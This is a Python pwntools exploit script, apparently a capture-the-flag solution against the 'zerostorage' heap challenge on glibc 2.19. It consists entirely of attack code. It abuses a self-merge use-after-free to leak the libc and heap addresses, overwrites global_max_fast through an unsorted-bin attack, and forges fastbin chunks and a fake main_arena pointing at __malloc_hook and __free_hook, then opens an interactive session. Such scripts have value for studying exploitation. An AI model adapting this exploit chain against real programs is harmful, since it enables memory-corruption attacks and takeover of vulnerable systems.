from pwn import *
import sys

context.arch 	= 'amd64'
elf 		= ELF("./zerostorage")
status 		= sys.argv[1]
global_max_fast = (0x7f5c09de4b40-0x00007f5c09a23000)

if status == 'l':
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
	io = process("./zerostorage")
elif status == 'd':
	libc = ELF("./libc-2.19.so")
	io = process("./zerostorage",env = {"LD_PRELOAD":"./libc-2.19.so"})
	context.log_level = "debug"
else:
	info("INVALID STATUS")
	exit()

def choice(c):
	io.sendlineafter("Your choice: ",str(c))
def insert(size,data=''):
	data = data.ljust(size,'A')
	choice(1)
	io.sendlineafter("Length of new entry: ",str(size))
	io.sendafter("data: ",data)
def update(ID,size,data):
	choice(2)
	io.sendlineafter("Entry ID: ",str(ID))
	io.sendlineafter("Length of entry: ",str(size))
	io.sendafter("data: ",data)
def merge(fromID,toID):
	choice(3)
	io.sendlineafter("Merge from Entry ID: ",str(fromID))
	io.sendlineafter("Merge to Entry ID: ",str(toID))
def delete(ID):
	choice(4)
	io.sendlineafter("Entry ID: ",str(ID))
def view(ID,size):
	choice(5)
	io.sendlineafter("Entry ID: ",str(ID))
	io.recvuntil(":\n")
	return io.recv(size)
def printlist():
	choice(6)
	io.recvuntil("No Length\n")
	return io.recv()

insert(0x80,data = 'B'*0x70+p64(0)+p64(0x91))	#0
insert(8)	#1
insert(0x20)	#2
insert(8)	#3
insert(8)	#4
insert(0x90)	#5
insert(0x90)	#6
merge(1,1)	#7
buf = view(7,0x10)
libc_base = u64(buf[:8])-(libc.sym['__malloc_hook']+0x20+88)
success("LIBC BASE -> %#x"%libc_base)

update(7,0x10,'A'*0x8+p64(libc_base+global_max_fast-0x10))
#stupid me write max_fast to bk_nextsize...now i've fixed it
insert(0x80,data = 'A'*0x60+p64(0)+p64(0xa1)+p64(0)+p64(0xa1))	#1
delete(0)
merge(2,2)	#0
buf = view(0,8)
update(0,1,'\x80')
heap_base = (u64(buf)&0xfffffffff000)
success("HEAP BASE -> %#x"%heap_base)
insert(8)	#2
insert(0x18,data = p64(0)+p64(0xa1)+p64(0xa1))	#8
update(0,0x40,p64(0)+p64(0xa1)+p64(0)+p64(0xa1)+p64(0)+p64(0xb1)+p64(0)+p64(0xb1))
delete(1)
update(8,0x18,p64(0)+p64(0xa1)+p64(0xb1))
insert(0x90)	#1
info("EVIL FD of fast(size==0xa1) == 0xb1")
update(8,0x10,p64(0)+p64(0xb1))
delete(1)
update(8,0x18,p64(0)+p64(0xb1)+p64(libc_base+libc.sym['__malloc_hook']+0x20+64))
insert(0xa0)	#1

fake_arena = p64(0)+p64(libc_base+libc.sym['__free_hook']-0x10)
fake_arena += p64(0)
for i in range(8):
	fake_arena += p64(libc_base+0x3bf7b8+i*0x10)*2
fake_arena += p64(libc_base+0x3bf7b8+0x80)
insert(0xa0,data = fake_arena)
info("Control main_arena.top but its fastfd is in need of recovery")
'''
delete(1)
update(8,0x18,p64(0)+p64(0xb1)+p64(heap_base+0x80))
insert(0xa0)	#1
'''
io.interactive()
